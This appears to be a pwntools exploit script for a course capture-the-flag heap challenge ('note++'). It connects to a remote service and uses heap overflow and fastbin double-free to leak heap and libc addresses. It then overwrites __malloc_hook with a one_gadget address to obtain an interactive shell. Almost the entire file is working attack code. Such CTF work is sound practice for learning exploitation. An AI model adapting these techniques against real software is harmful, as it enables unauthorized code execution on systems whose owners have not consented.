from pwn import *

host = 'edu-ctf.csie.org'
port = 10181

#r = process('./note++')
r = remote(host, port)

l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def add(size, note, description):
	r.sendlineafter('> ', b'1')
	#print('send : ', size)
	r.sendafter('Size: ', str(size).encode())
	r.sendafter('Note: ', note.encode())
	r.sendlineafter('Description of this note: ', description.encode())

def _list():
	r.sendlineafter('> ', b'2')

def delete(index):
	r.sendlineafter('> ', b'3')
	r.sendafter('Index: ', str(index).encode())

def add_byte(size, note, description):
	r.sendlineafter('> ', b'1')
	#print('send : ', size)
	r.sendafter('Size: ', str(size).encode())
	r.sendafter('Note: ', note)
	r.sendlineafter('Description of this note: ', description.encode())

# first round(target: leak heap_base)
add(0x18, 'aaaaaaaa', '00')
add(0x58, 'bbbbbbbb', '10')
add(0x58, 'bbbbbbbb', '10')

delete(0)
delete(1)

add(0x18, 'aaaaaaaa', 'd' * 48)

delete(2)
delete(1)
delete(0)
add(0x18, 'aaaaaaaa', 'd' * 48)
_list()
r.recvuntil('Data: ')
r.recvuntil('Data: ')
heap_base = u64(r.recv(6) + b'\x00\x00') - 0x80
print 'heap_base = ', hex(heap_base)

# new round(target: leak libc_base)
add(0x08, 'aaaa', 'zero')		# index = 2
add(0x68, 'bbbbbbbb', 'frist')
add(0x68, '\x00' * 0x18 + p64(0x51), 'second')
delete(2)
#add(0x00, 'aaaa', 'd')

#pause()
add_byte(0x0, b'\x00' * 0x18 + p64(0x91), 'note' )
delete(3)
delete(2)
add(0x18, 'aaaaaaaa', 'd' * 48)
_list()
r.recvuntil('Data: ')
r.recvuntil('Data: ')
r.recvuntil('Data: ')
r.recvuntil('Data: ')
main_arena = u64(r.recv(6) + b'\x00\x00') - 88
print 'main_arena = ', hex(main_arena)
libc_base = main_arena - 0x3c4b20
print 'libc_base = ', hex(libc_base)
malloc_hook = main_arena - 0x10 - 0x10 - 0x3
system_plt = 0x000000000045390 + libc_base
one_gadget = 0x45216 + libc_base # rax == NULL
one_gadget2  = 0xf1147 + libc_base # rsp + 0x70 = NULL
one_gadget3 = 0x4526a + libc_base # rsp + 0x30
one_gadget4 = 0xf02b0 + libc_base # rsp + 0x30
one_gadget5 = 0xf02a4 + libc_base

#print 'malloc_hook = ', hex(malloc_hook)
free_hook = main_arena + 0x1c88 - 0x10 - 0x10 - 0x03
pop_rsp = 0x0000000000003838 + libc_base
rsp_0x38 = 0x143e08 + libc_base
pop_rdi = 0x21102 + libc_base
system = 0x45390 + libc_base
add(0x08, 'aaaa', 'cheat')		# index = 2
add(0x68, 'bbbbbbbb', 'find_malloc_hook')
add(0x68, 'bbbbbbbb', 'find_malloc_hook')
#add_byte(0x58, p64(one_gadget3), 'one_gadget')
delete(7)
delete(6)
delete(5)

#add(0x08, 'aaaa', 'cheatter') #5 	
#add(0x48, 'bbbbbbbb', 'double free') #6
print 'one_gadget3 ', hex(one_gadget3)
add_byte(0x0, b'\x00' * 0x18 + p64(0x71) + p64(malloc_hook), 'note' )
#pause()
add(0x68, 'dddddddddddddddd', 'one')
#pause()

add(0x08, 'aaaa', 'cheatter') #	
add(0x38, 'EeEeEeEeEeEeEe', 'doublefree') #
delete(7)
delete(8)
#r.interactive()	

add(0x0, 'IwannaClean', 'a'  * 48 )
#r.interactive()	

add_byte(0x68, b'\x7f\x00\x00' + p64(one_gadget5) + p64(0x0) * 4 + p64(heap_base + 0x270), 'fake_chunk')

r.interactive()	

